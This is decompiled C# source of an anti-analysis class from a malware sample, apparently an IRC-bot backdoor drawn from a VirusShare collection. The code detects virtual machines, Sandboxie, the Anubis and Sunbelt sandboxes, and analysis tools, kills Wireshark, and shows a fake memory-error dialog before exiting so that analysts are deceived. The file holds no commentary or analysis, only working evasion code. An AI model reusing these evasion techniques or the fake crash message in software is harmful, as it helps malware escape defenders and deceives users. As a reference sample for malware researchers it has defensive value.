// Decompiled with JetBrains decompiler
// Type: Realtek.Antis
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Realtek
{
  internal class Antis
  {
    public static void CheckDebug()
    {
      if (Antis.AntiVirtualPC())
        Antis.Detected();
      else if (Antis.AntiAnubis())
        Antis.Detected();
      else if (Antis.AntiAnubis2())
        Antis.Detected();
      else if (Antis.AntiSandboxie())
        Antis.Detected();
      else if (Antis.AntiWireShark())
        Antis.Detected();
      else if (Antis.AntiVirtualBox())
      {
        Antis.Detected();
      }
      else
      {
        if (!Antis.AntiSunbelt())
          return;
        Antis.Detected();
      }
    }

    private static void Detected()
    {
      int num = (int) MessageBox.Show("Application Error: The instruction at \"0x78ec83b4\" referenced memory at \"0x00405467\". The memory could not be \"read\".", "Critical Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Environment.Exit(0);
    }

    private static bool AntiVirtualBox() => Antis.prcIsRunning("VBoxService");

    private static bool AntiSunbelt() => Directory.Exists("C:\\analysis");

    private static bool AntiWireShark()
    {
      if (!Antis.prcIsRunning("wireshark.exe"))
        return false;
      Antis.killProcess("wireshark.exe");
      return true;
    }

    private static bool AntiSandboxie() => Process.GetProcessesByName("SbieSvc").Length >= 1 | Process.GetProcessesByName("sniff_hit").Length >= 1 | Process.GetProcessesByName("sysAnalyzer").Length >= 1;

    private static bool AntiAnubis() => Application.ExecutablePath == Application.StartupPath + "\\sample.exe";

    private static bool AntiAnubis2() => (string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false).GetValue("ProductId") == "76487-337-8429955-22614";

    private static bool AntiVirtualPC() => Process.GetProcessesByName("vpcmap").Length >= 4 & Process.GetProcessesByName("vmsrvc").Length >= 4 || Process.GetProcessesByName("vmusrvc").Length >= 4;

    public static bool prcIsRunning(string process)
    {
      foreach (Process process1 in Process.GetProcesses())
      {
        if (process1.ProcessName == process)
          return true;
      }
      return false;
    }

    public static void killProcess(string process)
    {
      foreach (Process process1 in Process.GetProcesses())
      {
        if (process1.ProcessName.Equals(process))
          process1.Kill();
      }
    }
  }
}
